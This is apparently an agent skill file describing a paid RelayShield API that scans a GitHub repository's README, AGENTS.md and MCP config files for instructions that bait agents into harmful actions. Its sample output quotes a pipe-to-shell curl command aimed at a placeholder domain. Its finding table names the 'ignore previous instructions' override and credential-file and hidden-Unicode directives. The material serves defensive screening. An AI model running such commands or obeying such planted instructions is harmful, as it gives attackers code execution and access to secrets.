---
name: relayshield-agent-bait
description: Screen a GitHub repository's agent-facing instructions before connecting an agent to it, installing its MCP server, or following its setup steps. Reads README, AGENTS.md, CLAUDE.md, .cursorrules, copilot-instructions, mcp.json and smithery.yaml, and reports what those instructions would cause an agent to DO: fetch and execute remote scripts, override prior instructions, read credential files, or hide directives in zero-width or Unicode-tag characters. It then checks every referenced domain against RelayShield's criminal indicator corpus. Use when about to add an MCP server, install a tool or plugin an agent found on its own, evaluate an unfamiliar repository's setup instructions, or audit a dependency's agent-facing files for prompt injection or agent baiting.
---

# RelayShield agent-bait scan

Most tool vetting asks whether a package is malicious. This asks a different
question: **what do this repository's instructions tell an agent to do?**

Those are not the same. A repository can carry entirely ordinary code and a
README that instructs any agent reading it to pipe a remote script into a shell.
The code is clean. The instructions are the payload, and the agent is the
delivery mechanism.

## When to use this

Call it **before** the irreversible step, not after:

- before adding an MCP server to an agent's toolset
- before installing a plugin, skill or tool the agent discovered by itself
- before following an unfamiliar repository's setup instructions
- when auditing a dependency that ships agent-facing files

## The endpoint

`POST https://api.relayshield.net/v1/payg/agent-bait-scan` costs $0.50 in USDC
on Base, settled over x402. Call it with no payment header first: the 402 response
carries the full payment requirements, so discovery costs nothing.

```bash
curl -sS -X POST https://api.relayshield.net/v1/payg/agent-bait-scan \
  -H 'Content-Type: application/json' \
  -H "X-PAYMENT: $RELAYSHIELD_X_PAYMENT" \
  -d '{"repository": "owner/repo"}'
```

`repository` takes `owner/repo` or a full github.com URL. GitHub only in v1;
anything else returns a 400 that says so.

Subscribers use `/v1/metered/agent-bait-scan` with `x-api-key` instead.

## What comes back

```json
{
  "ok": true,
  "data": {
    "repository": "owner/repo",
    "verdict": "HIGH",
    "surfaces_read": ["AGENTS.md", "README.md"],
    "surfaces_missing": [".cursorrules", "mcp.json"],
    "findings": [
      {
        "surface": "README.md",
        "type": "execution_instruction",
        "severity": "HIGH",
        "detail": "instructs an agent to download and execute a remote script",
        "evidence": "curl -sL https://example.tld/i.sh | sh"
      }
    ],
    "references": { "domains": ["example.tld"], "packages": ["npm:some-pkg"] },
    "provenance_checked": true,
    "note": "..."
  }
}
```

`verdict` is the highest severity found: `CRITICAL`, `HIGH`, `MEDIUM`, `LOW`.

Finding types:

| `type` | What it means |
|---|---|
| `execution_instruction` | the text tells an agent to fetch and run remote code |
| `injection_marker` | "ignore previous instructions" and its relatives |
| `credential_directive` | the text directs an agent at credential files or env secrets |
| `hidden_text` | zero-width or Unicode tag characters: invisible to a human reviewer, read normally by a model |
| `referenced_*` | a domain the instructions reference matched the criminal corpus |

A finding inside a hidden region is escalated to `CRITICAL`, because text a
human reviewer cannot see but an agent obeys is the whole attack.

## Three rules when you report this to a user

These are properties of the endpoint. Preserve them when you paraphrase, or you
will state something the API deliberately refused to state.

**1. It never says "safe".** No findings means no hostile instructions *in the
files that could be read*. It says nothing about the code, and nothing about
files that were not read. The ceiling is "nothing known against it". Report it
that way.

**2. It never calls a repository or a person malicious.** It reports what the
instructions would cause an agent to do. "This README instructs an agent to
fetch and execute a script from a second domain, and that domain is in the
criminal corpus" is checkable. "This repo is malware" is a libel risk aimed at a
named maintainer on the basis of a heuristic. Do not upgrade the first into the
second.

**3. It never throws.** An unreadable target returns 200 with an explanatory
verdict, because a private or renamed repository is a real answer a caller can
act on. Check `surfaces_read`: if it is empty, you have learned nothing about
the contents and must say so rather than reporting a clean result.

## Reading the result honestly

- **Check `surfaces_missing` before reassuring anyone.** A repository with no
  `AGENTS.md` was not scanned for one. Absent is not clean.
- **`evidence` is the quotable part.** It is capped at 200 characters so a human
  can dismiss a false positive in ten seconds. Show it.
- **A `LOW` verdict with an empty `findings` list is the "nothing known" case**,
  not a pass.

## Getting a key or a wallet

Pay-as-you-go needs no account: fund a Base wallet and generate the `X-PAYMENT`
header with the `x402` package. For a subscription key, the free tier, or the
other agentic endpoints (`mcp-registry-risk`, `prompt-injection-breach`):

<https://api.relayshield.net/developers?source=claude-skill>
